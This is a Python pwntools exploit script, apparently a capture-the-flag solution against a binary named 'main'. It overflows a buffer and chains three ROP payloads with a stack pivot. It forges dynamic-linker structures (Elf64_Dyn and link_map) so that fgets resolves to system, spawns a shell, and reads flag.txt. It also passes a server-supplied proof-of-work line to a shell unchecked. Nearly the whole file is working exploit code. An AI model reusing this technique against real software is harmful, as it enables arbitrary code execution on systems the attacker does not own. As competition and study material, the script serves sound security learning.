#!/usr/bin/env python3

from pwn import *

exe = ELF('./bin/main')

host = args.HOST or 'localhost'
port = args.PORT or 31173

# structs and ctype stuff
from pwnlib.elf.datatypes import Elf64_Dyn, _U__Elf64_Dyn, constants as elf_const
from ctypes import sizeof

def pack(start, structs, padchr=b'A'):
  '''
  packs structs starting at an address, padding as needed
  '''
  data = b''
  for addr, struct in structs:
    current = start+len(data)
    if addr < current:
      raise ValueError('Overlapping structs')
    data += padchr*(addr-current)
    data += bytes(struct)
  return data

def dump(structs):
  '''
  prints structs
  '''
  for addr, struct in structs:
    print(f'0x{addr:x}: {type(struct).__name__}')
    print(hexdump(bytes(struct)))

# BUILD STRUCTS ------------------------------------------------------------------------
structs = []
structs_base = exe.bss()+0x100

# offset to fgets (we'll be replacing it with system)
strtab_offset = exe.section('.dynstr').index(b'fgets\x00')

# Elf64_Dyn
dynamic_entry = Elf64_Dyn(d_tag=elf_const.DT_STRTAB)
structs.append((structs_base, dynamic_entry))

# strings
system_addr = structs_base + sizeof(Elf64_Dyn)
system = b'system\x00'
structs.append((system_addr, system))
sh_addr = system_addr + len(system)
sh = b'/bin/sh > /tmp/stdout\x00'
structs.append((sh_addr, sh))

# go back and link them together
dynamic_union = _U__Elf64_Dyn()
dynamic_union.d_ptr = system_addr - strtab_offset
dynamic_entry.d_un = dynamic_union

# BUILD PARTIAL LINK_MAP ---------------------------------------------------------------
link_map =  p64(0)*2
link_map += p64(0x600e20)
link_map += p64(0)*10
link_map += p64(structs_base)   # DT_STRTAB
link_map += p64(0x600eb0)       # DT_SYMTAB
# this was previously just three p64s because I did not know that the
# beginning of link_map could be overwritten

# EXPLOIT ------------------------------------------------------------------------------
if args.LOCAL:
  r = exe.process(cwd='./bin')
else:
  from subprocess import check_output
  r = remote(host, port)
  r.recvuntil('proof of work: ')
  log.info('running pow')
  r.send(check_output(r.recvline(), shell=True))

def debug():
  if args.LOCAL:
    gdb.attach(r)
    pause()

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

func_input = 0x400757
func_fetch = 0x4007a2 # this is now unused

# ROP chain #1
# set rbp, input structs, input ROP chain #2, return to fetch_data
log.info('ROP #1')
payload =  b'A'*32
payload += p64(0x601010)            # put rbp here, right after link_map
payload += p64(pop_rdi)
payload += p64(structs_base)        # input structs
payload += p64(func_input)
payload += p64(pop_rdi)
payload += p64(0x601018)            # input ROP chain #2
payload += p64(func_input)
payload += p64(pop_rdi)
payload += p64(exe.bss() + 0x800)   # input ROP chain #3
payload += p64(func_input)
payload += p64(func_input+12)       # overwrite link_map
# this was previously func_fetch+48 because I did not know that the
# beginning of link_map could be overwritten

# we're jumping to the middle here
# 1) overwrite ~~link_map+64~~ link_map
# 2) leave; ret at the end
r.sendlineafter('data:\n', 'a')
r.sendlineafter('ID:\n', payload)

log.info('Sending structs')
dump(structs)
r.sendline(pack(structs_base, structs))

# ROP chain #2 in GOT
pivot = rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret']).address
log.info('ROP #2')
payload =  p64(pivot)
payload += p64(exe.bss() + 0x800 - 3*8)
r.sendline(payload)

# ROP chain #3
log.info('ROP #3')
payload =  p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(exe.symbols['fgets']+6)
r.sendline(payload)

# overwrite link_map
log.info('Overwriting link_map')
r.sendline(link_map)

# shell
r.clean()
r.sendline('cat flag.txt')
r.interactive()
